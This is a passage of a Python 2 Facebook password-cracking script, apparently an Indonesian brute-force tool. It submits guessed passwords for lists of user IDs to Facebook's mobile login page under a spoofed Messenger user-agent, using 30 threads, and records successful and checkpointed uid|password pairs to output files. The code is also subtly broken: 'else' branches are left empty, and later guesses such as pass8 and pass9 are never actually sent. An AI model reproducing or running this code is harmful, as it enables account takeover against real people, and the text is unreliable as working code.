							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							else:
							pass8 = 'proplayer'
							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							else:
							pass9 = 'budi01gaming'
							rex = requests.post('https://touch.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'}, headers={'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'})
							xo = rex.url
							if 'home' in xo or 'get' in xo or 'save' in xo or 'actor' in xo:
								print '\033[0;92m*----> \033[0;92m[\033[0;92mOK\033[0;92m] ' +uid+ ' | ' + pass5
								ok.append(uid+' | '+pass5)
								save = open('out/ok.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
							elif 'checkpoint' in xo or 'confirm' in xo or 'cuid' in xo:
								print '\033[0;93m*----> \033[0;93m[\033[0;93mCP\033[0;93m] ' +uid+ ' | ' + pass5
								cp.append(uid+' | '+pass5)
								save = open('out/cp.txt','a') 
								save.write(str(uid)+' | '+str(pass5)+'\n')
								save.close()
				
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print "\n [+] Finished"
	print " [*] Total \033[0;92mOK\033[0;97m : "+str(len(ok))
	print " [*] Total \033[0;93mCP\033[0;97m : "+str(len(cp))
	exit()

### coded by Syamsul Hakim ID
### kalau bisa di pake ngapain di recode
### https://github.com/HAKIM4-art
if __name__ == '__main__':
	if len(sys.argv) == 2:
		if sys.argv[1] == 'result':
			os.system("clear")
			print logo
			print " [+] Hasil Crack \033[0;93mCP\033[0;97m :"
			os.system('cat out/cp.txt')
			print " [+] Hasil Crack \033[0;92mOK\033[0;97m :"
			os.system('cat out/ok.txt')
			exit(" [#] Silakan Di Copy Hasil Crack Nya")
		if sys.argv[1] == 'touch':
			os.system("git pull")
			if os.path.exists("login.txt"):
				pass
			else:open("login.txt","a+").close()
			menutouch()
		else:
			print " [!] Cara Menggunakan? "
			print " [*] Ketik : python2 multi-smbf.py touch Untuk Method Crack Touch FB"
			exit("   [*] Ketik : python2 multi-smbf.py result Untuk Cek Result")
	os.system("clear")
	print logo
	print " [#] Hallo Mohon Bersabar Lagi Update Dulu Ajg..."
	os.system("git pull")
	time.sleep(1)
	tokenz()